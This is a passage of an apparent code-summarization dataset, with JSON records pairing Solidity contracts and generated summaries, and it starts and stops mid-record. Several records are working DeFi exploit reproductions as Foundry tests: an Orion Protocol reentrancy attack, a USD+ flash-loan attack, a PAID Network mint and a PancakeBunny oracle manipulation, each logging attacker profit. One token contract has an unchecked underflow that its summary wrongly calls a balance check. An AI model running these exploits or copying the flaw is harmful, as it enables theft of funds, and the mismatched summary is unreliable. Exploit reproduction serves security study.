uint112(USDT.balanceOf(address(Orion)) - 1));\n        address(USDT).call(abi.encodeWithSignature(\"transfer(address,uint256)\", address(Pair), flashAmount * 1000 / 997 + 1000));\n    }\n\n    function addLiquidity() internal {\n        Factory.createPair(address(ATK), address(USDT));\n        address Pair1 = Factory.getPair(address(ATK), address(USDT));\n        Factory.createPair(address(ATK), address(USDC));\n        address Pair2 = Factory.getPair(address(ATK), address(USDC));\n        address(USDT).call(abi.encodeWithSignature(\"transfer(address,uint256)\", address(Pair1), 5 * 1e5));\n        ATK.transfer(address(Pair1), 50 * 1e18);\n        USDC.transfer(address(Pair2), 5 * 1e5);\n        ATK.transfer(address(Pair2), 50 * 1e18);\n        Uni_Pair_V2(Pair1).mint(address(this));\n        Uni_Pair_V2(Pair2).mint(address(this));\n    }\n\n    function deposit() external {\n        Orion.depositAsset(address(USDT), uint112(USDT.balanceOf(address(this))));\n    }\n\n    function USDTToWETH() internal {\n        address(USDT).call(abi.encodeWithSignature(\"approve(address,uint256)\", address(RouterV3), type(uint256).max));\n        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({\n            tokenIn: address(USDT),\n            tokenOut: address(WETH),\n            fee: 3000,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: USDT.balanceOf(address(this)),\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        });\n        RouterV3.exactInputSingle(_Params);\n    }\n}\n\ncontract ATKToken is IERC20 {\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    string public name = \"ATKToken\";\n    string public symbol = \"ATK\";\n    uint8 public decimals = 18;\n    address public exp;\n    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n    ORION Orion = ORION(0xb5599f568D3f3e6113B286d010d2BCa40A7745AA);\n\n    constructor(address exploiter) {\n        mint(100 * 1e18);\n        exp = exploiter;\n    }\n\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        if (USDT.balanceOf(exp) > 1e6) {\n            exp.call(abi.encodeWithSignature(\"deposit()\"));\n        }\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint256 amount) public {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint256 amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n\n    function withdraw(uint256 wad) external{}\n    function deposit(uint256 wad) external returns (bool){}\n    function owner() external view returns (address){}\n}\n",
        "summary": "This code is a test contract that attempts to exploit a reentrancy vulnerability in the Orion Protocol smart contract. The contract first sets up some necessary variables and functions, then calls a function to add liquidity to a pair and deposit USDC to an Orion pool. It then swaps USDT for WETH and logs the WETH balance of the contract. The contract also implements a callback function `uniswapV2Call` that is called whenever a Uniswap transaction occurs, which uses the Orion Protocol to swap tokens and withdraw USDT from the Orion pool. Finally, the contract implements a mock token contract called ATKToken that checks the balance of a specified address and performs a deposit if that balance exceeds a threshold.",
        "id": "6b65d489-adf1-49cc-bd8b-c52642ff9ab3"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Token {\n  mapping(address => uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) {\n    balances[msg.sender] = totalSupply = _initialSupply;\n  }\n  \n  function transfer(address _to, uint _value) public returns (bool) {\n    unchecked{\n        require(balances[msg.sender] - _value >= 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n    }\n    return true;\n  }\n  function balanceOf(address _owner) public view returns (uint balance) {\n    return balances[_owner];\n  }\n}\n",
        "summary": "The code defines a basic ERC20-compliant token that can be transferred from one address to another. The token contract keeps track of the total supply of the token and the balance of each account using a mapping. In the constructor, the initial supply is set for the account creating the contract. The `transfer()` function allows an account to send tokens to another account and checks that the sending account has enough tokens to make the transfer. The `balanceOf()` function allows anyone to query the token balance of a specific account.",
        "id": "7bd2d36f-13e0-4606-8f78-0ddc61af5ee1"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n    contract Overload {\n    function saySomething() public pure returns(string memory){\n        return(\"Nothing\");\n    }\n\n    function saySomething(string memory something) public pure returns(string memory){\n        return(something);\n    }\n\n    function f(uint8 _in) public pure returns (uint8 out) {\n        out = _in;\n    }\n\n    function f(uint256 _in) public pure returns (uint256 out) {\n        out = _in;\n    }\n}\n",
        "summary": "This code defines a smart contract called \"Overload\" that contains four functions. The first function is called \"saySomething\" and returns a string \"Nothing\". The second function is also called \"saySomething\" but takes a parameter \"something\" and returns the value of that parameter. The third function is called \"f\" and takes an input value of type uint8 and returns the same value. The fourth function is also called \"f\" but takes an input value of type uint256 and returns the same value. These two functions are examples of function overloading, where functions with the same name differ in the number or type of their parameters. The code also specifies that the SPDX-License-Identifier is MIT and that the contract is written in version 0.8.4 of the Solidity programming language.",
        "id": "566db30a-219c-446f-a708-45f0e695fd99"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1598704809690877952\n// @Address\n// https://snowtrace.io/address/0xfe2c4cb637830b3f1cdc626b99f31b1ff4842e2c\n\ninterface JoeRouter{\n    function swapAVAXForExactTokens(\n        uint256 amountOut,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable returns (uint256[] memory amounts);\n}\n\ninterface USDPlus{\n    function buy(address _referredBy, uint256 amount) external returns (uint256);\n    function redeem(address to, uint256 amount) external returns (uint256 redeemed);\n}\ninterface SwapFlashLoan{\n    function calculateTokenAmount(\n        uint256[] calldata amounts,\n        bool deposit\n    ) external view returns (uint256);\n\n    function addLiquidity(\n        uint256[] calldata amounts,\n        uint256 minToMint,\n        uint256 deadline\n    ) external returns (uint256);\n\n    function calculateRemoveLiquidity(uint256 amount) external returns (uint256[] memory);\n\n    function removeLiquidityImbalance(\n        uint256[] calldata amounts,\n        uint256 maxBurnAmount,\n        uint256 deadline\n    ) external returns (uint256);\n\n    function swap(\n        uint8 tokenIndexFrom,\n        uint8 tokenIndexTo,\n        uint256 dx,\n        uint256 minDy,\n        uint256 deadline\n    ) external returns (uint256);\n}\n\ninterface BenqiFinance{\n    function enterMarkets(address[] memory qiTokens) external returns (uint[] memory);\n    function getAccountLiquidity(address account) external view returns (uint, uint, uint);\n    function getHypotheticalAccountLiquidity(\n        address account,\n        address qiTokenModify,\n        uint redeemTokens,\n        uint borrowAmount) external view returns (uint, uint, uint);\n}\n\ninterface BenqiChainlinkOracle{\n    function getUnderlyingPrice(address qiToken) external view returns (uint);\n}\n\ninterface QiUSDCn{\n    function mint(uint mintAmount) external returns (uint);\n    function redeemUnderlying(uint redeemAmount) external returns (uint);\n}\n\ninterface QiUSDC{\n    function borrow(uint borrowAmount) external returns (uint);\n    function repayBorrow(uint repayAmount) external returns (uint);\n    function borrowBalanceStored(address account) external view returns (uint);\n}\n\ninterface PlatypusFinance{\n    function swap(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount,\n        uint256 minimumToAmount,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ninterface NetAsset{\n    function netAssetValue() external view returns (uint256);\n}\n\ninterface TotalNetAsset{\n    function totalNetAssets() external view returns (uint256);\n}\n\ninterface SicleRouter{\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ncontract ContractTest is DSTest{\n    JoeRouter Router = JoeRouter(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);\n    SicleRouter sicleRouter = SicleRouter(0xC7f372c62238f6a5b79136A9e5D16A2FD7A3f0F5);\n    USDPlus USDplus =USDPlus(0x73cb180bf0521828d8849bc8CF2B920918e23032);\n    SwapFlashLoan Swap = SwapFlashLoan(0xED2a7edd7413021d440b09D654f3b87712abAB66);\n    IAaveFlashloan LendingPoolV2 = IAaveFlashloan(0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C);\n    IAaveFlashloan PoolV3  = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);\n    BenqiFinance Benqi = BenqiFinance(0x486Af39519B4Dc9a7fCcd318217352830E8AD9b4);\n    BenqiChainlinkOracle Oracle = BenqiChainlinkOracle(0x316aE55EC59e0bEb2121C0e41d4BDef8bF66b32B);\n    QiUSDCn qiUSDCn = QiUSDCn(0xB715808a78F6041E46d61Cb123C9B4A27056AE9C);\n    PlatypusFinance Platypus = PlatypusFinance(0x66357dCaCe80431aee0A7507e2E361B7e2402370);\n    QiUSDC qiUSDC = QiUSDC(0xBEb5d47A3f720Ec0a390d04b4d41ED7d9688bC7F);\n    NetAsset netAsset = NetAsset(0xc2c84ca763572c6aF596B703Df9232b4313AD4e3);\n    TotalNetAsset totalNetAsset = TotalNetAsset(0x9Af655c4DBe940962F776b685d6700F538B90fcf);\n    IERC20 USDPLUS = IERC20(0xe80772Eaf6e2E18B651F160Bc9158b2A5caFCA65);\n    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);\n    IERC20 nUSD = IERC20(0xCFc37A6AB183dd4aED08C204D1c2773c0b1BDf46);\n    IERC20 DAI_e = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);\n    IERC20 USDT_e = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);\n    IERC20 USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);\n    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);\n    IERC20 nUSDLP = IERC20(0xCA87BF3ec55372D9540437d7a86a7750B42C02f4);\n    address avUSDC = 0x46A51127C3ce23fb7AB1DE06226147F446e4a857;\n    uint PoolV2BorrowAmount;\n    uint amountBuy;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n\n    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 23097846); \n    }\n\n    function testExploit() public payable{\n        amountBuy = 36_000_000_000;\n        address[] memory path = new address[](2);\n        path[0] = address(WAVAX);\n        path[1] = address(USDC);\n        Router.swapAVAXForExactTokens{value: 2830 ether}(amountBuy, path, address(this), block.timestamp);\n\n        uint beforeAttackBalance = USDC.balanceOf(address(this));\n        emit log_named_uint(\n            \"Before exploit , USDC balance of attacker\",\n            beforeAttackBalance / 1e6\n        );\n\n        Hack();\n\n        uint afterAttackBalance = USDC.balanceOf(address(this));\n        emit log_named_uint(\n            \"After exploit , USDC balance of attacker\",\n            afterAttackBalance / 1e6\n        );\n\n        uint profitAttack = afterAttackBalance - beforeAttackBalance;\n        emit log_named_uint(\n            \"Profit: USDC balance of attacker\",\n            profitAttack / 1e6\n        );\n\n    }\n\n    function Hack() public {\n        for(uint i = 0; i < 6; i++){\n            cheats.roll(block.number + 1);\n            PoolV2BorrowAmount = USDC_e.balanceOf(avUSDC);\n            address[] memory assets = new address[](1);\n            assets[0] = address(USDC_e);\n            uint256[] memory amounts = new uint256[](1);\n            amounts[0] = PoolV2BorrowAmount;\n            uint256[] memory modes = new uint[](1);\n            modes[0] = 0;\n            LendingPoolV2.flashLoan(address(this),assets, amounts, modes, address(this), \"\", 0); // FlashLoan USDC.e\n            cheats.roll(block.number + 1); // USD+ buy and redeem not allowed in one block\n            // redeem USD+ to USDC\n            if((totalNetAsset.totalNetAssets() - netAsset.netAssetValue()) > USDPLUS.balanceOf(address(this))){\n                USDplus.redeem(address(USDC), USDPLUS.balanceOf(address(this)));\n            }else{\n                USDplus.redeem(address(USDC), totalNetAsset.totalNetAssets() - netAsset.netAssetValue());\n            }\n        }\n        USDPLUS.approve(address(sicleRouter), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(USDPLUS);\n        path[1] = address(USDC);\n        sicleRouter.swapExactTokensForTokens(USDPLUS.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n\n    }\n\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        if(msg.sender == address(LendingPoolV2)){\n            USDC_e.approve(address(LendingPoolV2), type(uint).max);\n            address[] memory assets1 = new address[](1);\n            assets1[0] = address(USDC);\n            uint256[] memory amounts1 = new uint256[](1);\n            amounts1[0] = PoolV2BorrowAmount / 2;\n            uint256[] memory modes = new uint[](1);\n            modes[0] = 0;\n            PoolV3.flashLoan(address(this), assets1, amounts1, modes, address(this), \"\", 0); // FlashLoan USDC\n\n            return true;\n        } else{\n            USDC.approve(address(PoolV3), type(uint).max);\n            uint mintAmount = PoolV2BorrowAmount / 2;\n            USDC.approve(address(qiUSDCn), type(uint).max);\n            qiUSDCn.mint(mintAmount); // deposit USDC to qiUSDCn\n\n            address[] memory qiTokens = new address[](1);\n            qiTokens[0] = address(qiUSDCn);\n            Benqi.enterMarkets(qiTokens);\n            ( ,uint accountLiquidity, ) = Benqi.getAccountLiquidity(address(this));\n            uint oraclePrice = Oracle.getUnderlyingPrice(address(qiUSDC)) / 1e18;\n            uint borrowAmount = accountLiquidity / oraclePrice;\n            qiUSDC.borrow(borrowAmount); // borrow USDC.e from qiUSDC\n\n            \n            // swap USDC.e to nUSD, DAI.e, USDT.e \n            USDC_e.approve(address(Swap), type(uint).max);\n            nUSDLP.approve(address(Swap), type(uint).max);\n            uint256[] memory amount = new uint256[](4);\n            amount[2] = USDC_e.balanceOf(address(this));\n            uint minToMint = Swap.calculateTokenAmount(amount, true) * 99 / 100;\n            uint LPAmount = Swap.addLiquidity(amount, minToMint, block.timestamp);\n            uint i = 0;\n            while(i < 9){\n                uint256[] memory removeAmount = new uint256[](4);\n                removeAmount = Swap.calculateRemoveLiquidity(LPAmount);\n                removeAmount[2] = 0;\n                Swap.removeLiquidityImbalance(removeAmount, LPAmount, block.timestamp);\n                LPAmount = nUSDLP.balanceOf(address(this));\n                i++;\n            }\n            uint256[] memory removeAmount1 = new uint256[](4);\n            removeAmount1 = Swap.calculateRemoveLiquidity(LPAmount);\n            Swap.removeLiquidityImbalance(removeAmount1, LPAmount, block.timestamp);\n            uint swapAmount = USDC_e.balanceOf(address(this)) / 3;\n            nUSD.approve(address(Swap), type(uint).max);\n            DAI_e.approve(address(Swap), type(uint).max);\n            USDT_e.approve(address(Swap), type(uint).max);\n            // swap remaining USDC.e to nUSD, DAI.e, USDT.e\n            Swap.swap(2, 0, swapAmount, 0, block.timestamp);\n            Swap.swap(2, 1, swapAmount, 0, block.timestamp);\n            Swap.swap(2, 3, swapAmount, 0, block.timestamp);\n\n            USDC.approve(address(USDplus), type(uint).max);\n            USDplus.buy(address(USDC), USDC.balanceOf(address(this))); // tigger Swap.addLiquidity(USDC.e), add USDC.e reserve in Pool \n            // swap nUSD, DAI.e, USDT.e to USDC.e\n            Swap.swap(0, 2, nUSD.balanceOf(address(this)), 0, block.timestamp);\n            Swap.swap(1, 2, DAI_e.balanceOf(address(this)), 0, block.timestamp);\n            Swap.swap(3, 2, USDT_e.balanceOf(address(this)), 0, block.timestamp);\n\n            USDC_e.approve(address(qiUSDC), qiUSDC.borrowBalanceStored(address(this)));\n            qiUSDC.repayBorrow(qiUSDC.borrowBalanceStored(address(this))); // repay borrow USDC.e\n            qiUSDCn.redeemUnderlying(mintAmount); // withdraw USDC from qiUSDCn\n\n            USDC_e.approve(address(Platypus), type(uint).max);\n            uint USDC_eSwapAmount = USDC_e.balanceOf(address(this)) - PoolV2BorrowAmount / 9991 * 10000 + 1000;\n            Platypus.swap(address(USDC_e), address(USDC), USDC_eSwapAmount, USDC_eSwapAmount * 99 / 100, address(this), block.timestamp); // swap profit USDC.e to USDC\n\n            return true;\n\n        }\n        \n    }\n    receive() payable external{}\n}",
        "summary": "This code performs a flash loan attack on a DeFi protocol running on the Avalanche blockchain. It uses multiple interfaces to interact with various contracts such as a token swap router contract, lending contracts, and liquidity pool contracts. The attack is carried out by borrowing USDC tokens from a pool, using them to buy a different token (USD+), redeeming the USD+ token to gain additional USDC, and then swapping the redeemed USD+ tokens for even more USDC. The code uses a cheat code to manipulate the block number to work around limitations on buying and redeeming the USD+ token in the same block. Finally, the attacker repays the borrowed USDC tokens from the pool, withdraws the remaining assets, and makes a profit by swapping tokens on another exchange. The code includes comments to explain its functionalities.",
        "id": "24a40b39-1753-436e-96b1-f1b36dd36211"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\n/// @notice Simple single owner authorization mixin.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/auth/Owned.sol)\nabstract contract Owned {\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event OwnershipTransferred(address indexed user, address indexed newOwner);\n\n    /*//////////////////////////////////////////////////////////////\n                            OWNERSHIP STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    address public owner;\n\n    modifier onlyOwner() virtual {\n        require(msg.sender == owner, \"UNAUTHORIZED\");\n\n        _;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(address _owner) {\n        owner = _owner;\n\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                             OWNERSHIP LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        owner = newOwner;\n\n        emit OwnershipTransferred(msg.sender, newOwner);\n    }\n}\n",
        "summary": "This code defines an abstract contract, called \"Owned\", which mainly provides a simple single owner authorization mechanism. The contract holds an `owner` public variable and a function called `transferOwnership` which allows the current owner to transfer their ownership to another address. The only person who can call the `transferOwnership` function is the owner, which is enforced by the `onlyOwner` modifier. The contract also defines a constructor that sets the initial owner account and emits an event when the ownership is transferred. Finally, the code is released under the AGPL-3.0 license.",
        "id": "ee909ecd-b3a6-4e9c-aa66-1fe65d019b61"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {MockOwned} from \"./utils/mocks/MockOwned.sol\";\n\ncontract OwnedTest is DSTestPlus {\n    MockOwned mockOwned;\n\n    function setUp() public {\n        mockOwned = new MockOwned();\n    }\n\n    function testTransferOwnership() public {\n        testTransferOwnership(address(0xBEEF));\n    }\n\n    function testCallFunctionAsNonOwner() public {\n        testCallFunctionAsNonOwner(address(0));\n    }\n\n    function testCallFunctionAsOwner() public {\n        mockOwned.updateFlag();\n    }\n\n    function testTransferOwnership(address newOwner) public {\n        mockOwned.transferOwnership(newOwner);\n\n        assertEq(mockOwned.owner(), newOwner);\n    }\n\n    function testCallFunctionAsNonOwner(address owner) public {\n        hevm.assume(owner != address(this));\n\n        mockOwned.transferOwnership(owner);\n\n        hevm.expectRevert(\"UNAUTHORIZED\");\n        mockOwned.updateFlag();\n    }\n}\n",
        "summary": "This is a Solidity smart contract that defines a set of test functions to check the functionality of the `MockOwned` contract. The `setUp()` function creates an instance of the `MockOwned` contract which is then used by the test functions. The `testTransferOwnership()` function checks if the `transferOwnership()` function of the `MockOwned` contract is working as expected. The `testCallFunctionAsNonOwner()` function checks if the `updateFlag()` function of the `MockOwned` contract can only be called by the owner of the contract. The `testCallFunctionAsOwner()` function simply calls the `updateFlag()` function by the owner to update the flag. The `SPDX-License-Identifier` specifies the license under which the code is released. Finally, the `import` statements include external Solidity files namely `DSTestPlus.sol` and `MockOwned.sol` which contain utility and mock functionality respectively.",
        "id": "5d0bbfad-6fef-4121-805e-d7ea77d00aeb"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Owner {\n   address public owner; // \u5b9a\u4e49owner\u53d8\u91cf\n\n   // \u6784\u9020\u51fd\u6570\n   constructor() {\n      owner = msg.sender; // \u5728\u90e8\u7f72\u5408\u7ea6\u7684\u65f6\u5019\uff0c\u5c06owner\u8bbe\u7f6e\u4e3a\u90e8\u7f72\u8005\u7684\u5730\u5740\n   }\n\n   // \u5b9a\u4e49modifier\n   modifier onlyOwner {\n      require(msg.sender == owner); // \u68c0\u67e5\u8c03\u7528\u8005\u662f\u5426\u4e3aowner\u5730\u5740\n      _; // \u5982\u679c\u662f\u7684\u8bdd\uff0c\u7ee7\u7eed\u8fd0\u884c\u51fd\u6570\u4e3b\u4f53\uff1b\u5426\u5219\u62a5\u9519\u5e76revert\u4ea4\u6613\n   }\n\n   // \u5b9a\u4e49\u4e00\u4e2a\u5e26onlyOwner\u4fee\u9970\u7b26\u7684\u51fd\u6570\n   function changeOwner(address _newOwner) external onlyOwner{\n      owner = _newOwner; // \u53ea\u6709owner\u5730\u5740\u8fd0\u884c\u8fd9\u4e2a\u51fd\u6570\uff0c\u5e76\u6539\u53d8owner\n   }\n}\n",
        "summary": "This is a Solidity smart contract that defines a contract called \"Owner\". It has a state variable called \"owner\" and a constructor which sets the owner as the address that deploys the contract. It also has a modifier called \"onlyOwner\" which requires that only the owner can call a function and a function called \"changeOwner\" which changes the owner only if it is called by the owner.",
        "id": "80d0f95b-82df-4d8e-bbe7-6a95c197d288"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://paidnetwork.medium.com/paid-network-attack-postmortem-march-7-2021-9e4c0fef0e07\n// Root cause: key compromised or rugged\n\n// @TX\n// https://etherscan.io/tx/0x4bb10927ea7afc2336033574b74ebd6f73ef35ac0db1bb96229627c9d77555a0\n\n\ninterface IPaid {\n    function mint(address _owner, uint256 _amount) external;\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract ContractTest is DSTest{\n   // FakeToken FakeTokenContract;\n    IPaid PAID = IPaid(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 11979839);    // Fork mainnet at block 11979839\n    }\n\n    function testExploit() public {\n        \n        cheats.prank(0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE);  \n        PAID.mint(address(this),59471745571000000000000000); //key compromised or rugged\n        emit log_named_decimal_uint(\n            \"[End] PAID balance after exploitation:\",\n            PAID.balanceOf(address(this)),\n            18\n        );\n    }\n\n  receive() external payable {}\n}\n\n\n\n\n",
        "summary": "This code is a Solidity smart contract used for testing purposes. It imports a Test library and an interface for a token contract. The comments indicate that it may be related to an attack on the Paid Network. The contract has a function testExploit() that attempts to exploit a vulnerability by calling a prank function with a specific address and minting tokens to the contract address. It also logs the balance of the token contract after the exploit.",
        "id": "8c98e08a-77b0-406c-8059-0f2e750b1b12"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/**\nExploit:\nTx 1 : https://bscscan.com/tx/0x88fcffc3256faac76cde4bbd0df6ea3603b1438a5a0409b2e2b91e7c2ba3371a\n    Attacker zaps 1 BNB into WBNB-USDT VaultFlipToFlip \n\nharvest() tx: https://dashboard.tenderly.co/tx/bsc/0x9c48fd13d65f5f951882282444a45a7b84c4f673891bbdcc48af68ed305950bb/debugger?trace=0.0\n\nTx 2 : https://bscscan.com/tx/0x897c2de73dd55d7701e1b69ffb3a17b0f4801ced88b0c75fe1551c5fcce6a979\n    Attacker's price oracle manipulation transaction\n\nResources:\nhttps://pancakebunny.medium.com/hello-bunny-fam-a7bf0c7a07ba\nhttps://cmichel.io/bsc-pancake-bunny-exploit-post-mortem/\nhttps://rekt.news/pancakebunny-rekt/\nhttps://www.newsbtc.com/news/company/bsc-flash-loan-attack-pancakebunny/\n\n*/\n\ncontract ContractTest is DSTest {\n    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\n    address USDT = 0x55d398326f99059fF775485246999027B3197955;\n    address BUNNY = 0xC9849E6fdB743d08fAeE3E34dd2D1bc69EA11a51;\n\n    IVaultFlipToFlip flip =\n        IVaultFlipToFlip(0x633e538EcF0bee1a18c2EDFE10C4Da0d6E71e77B);\n\n    IBunnyZap zap = IBunnyZap(0xdC2bBB0D33E0e7Dea9F5b98F46EDBaC823586a0C);\n\n    IPancakeRouter router =\n        IPancakeRouter(payable(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F));\n\n    Uni_Pair_V2 WBNBUSDTv1 =\n        Uni_Pair_V2(0x20bCC3b8a0091dDac2d0BC30F68E6CBb97de59Cd);\n    Uni_Pair_V2 WBNBUSDTv2 =\n        Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);\n    Uni_Pair_V2 WBNBBUNNY =\n        Uni_Pair_V2(0x7Bb89460599Dbf32ee3Aa50798BBcEae2A5F7f6a);\n\n    Uni_Pair_V2 WBNBCAKE =\n        Uni_Pair_V2(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);\n    Uni_Pair_V2 WBNBBUSD =\n        Uni_Pair_V2(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);\n    Uni_Pair_V2 WBNBETH =\n        Uni_Pair_V2(0x74E4716E431f45807DCF19f284c7aA99F18a4fbc);\n    Uni_Pair_V2 WBNBBTC =\n        Uni_Pair_V2(0x61EB789d75A95CAa3fF50ed7E47b96c132fEc082);\n    Uni_Pair_V2 WBNBSAFEMOON =\n        Uni_Pair_V2(0x9adc6Fb78CEFA07E13E9294F150C1E8C1Dd566c0);\n    Uni_Pair_V2 WBNBBELT =\n        Uni_Pair_V2(0xF3Bc6FC080ffCC30d93dF48BFA2aA14b869554bb);\n    Uni_Pair_V2 WBNBDOT =\n        Uni_Pair_V2(0xDd5bAd8f8b360d76d12FdA230F8BAF42fe0022CF);\n    Uni_Pair_V2[] pairs = [\n        WBNBCAKE,\n        WBNBBUSD,\n        WBNBETH,\n        WBNBBTC,\n        WBNBSAFEMOON,\n        WBNBBELT,\n        WBNBDOT\n    ];\n\n    IFortubeBank FortubeBank =\n        IFortubeBank(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);\n\n    address keeper = 0x793074D9799DC3c6039F8056F1Ba884a73462051;\n\n    constructor() public {\n        cheat.createSelectFork(\"bsc\", 7556330);\n\n        IERC20(WBNB).approve(address(zap), 1e18);\n        IERC20(address(WBNBUSDTv2)).approve(address(flip), type(uint256).max);\n        IERC20(address(USDT)).approve(address(router), type(uint256).max);\n        IERC20(address(WBNB)).approve(address(router), type(uint256).max);\n    }\n  \n    function testExploit() public {\n        payable(WBNB).call{value: 1e18}(\"\");\n\n        emit log_named_decimal_uint(\n            \"Initial WBNB balance of attacker:\",\n            IERC20(WBNB).balanceOf(address(this)),\n            IERC20(WBNB).decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Initial USDT balance of attacker:\",\n            IERC20(USDT).balanceOf(address(this)),\n            IERC20(USDT).decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Initial BUNNY balance of attacker:\",\n            IERC20(BUNNY).balanceOf(address(this)),\n            IERC20(BUNNY).decimals()\n        );\n\n        // Deposit a minimum amount of WBNB + USDT to VaultFlipToFlip, transfer LP tokens to WBNB + USDT Pancake pool.\n        emit log_string(\"Zapping 1 WBNB into WBNB+USDT v2 pool...\");\n\n        zap.zapInToken(WBNB, 1e18, address(WBNBUSDTv2));\n        uint256 lpamount = IERC20(address(WBNBUSDTv2)).balanceOf(address(this));\n        flip.deposit(lpamount);\n\n        emit log_string(\n            \"After X blocks, the keeper of VaultFlipToFlip calls harvest()\"\n        );\n\n        cheat.warp(1655908339);\n        cheat.roll(7556391);\n\n        // Keeper needs to call flip.harvest() so that flip.earned(address(this)) > 0\n        cheat.prank(keeper);\n        (bool success, ) = address(flip).call(\n            abi.encodeWithSignature(\"harvest()\")\n        );\n        require(success, \"flip.harvest() fails\");\n\n        emit log_string(\"Exploit begins:\");\n\n        trigger();\n    }\n\n    function trigger() public {\n        if (flip.earned(address(this)) > 0) {\n            //Initiate flashloans\n            emit log_string(\"Initiate flashloans...\");\n\n            (uint256 _amount0, uint256 _amount1, ) = pairs[0].getReserves();\n            if (WBNB == pairs[0].token1()) {\n                pairs[0].swap(0, _amount1 - 1, address(this), abi.encode(0, 1));\n            } else {\n                pairs[0].swap(_amount0 - 1, 0, address(this), abi.encode(0, 0));\n            }\n\n            // execution passes to pancakeCall()\n\n            // all flashloans have been repaid!\n            emit log_string(\"All flashloans have been repaid!\");\n\n            //Collect profit\n            emit log_named_decimal_uint(\n                \"Collected WBNB profit:\",\n                IERC20(WBNB).balanceOf(address(this)),\n                IERC20(WBNB).decimals()\n            );\n            emit log_named_decimal_uint(\n                \"Collected USDT profit:\",\n                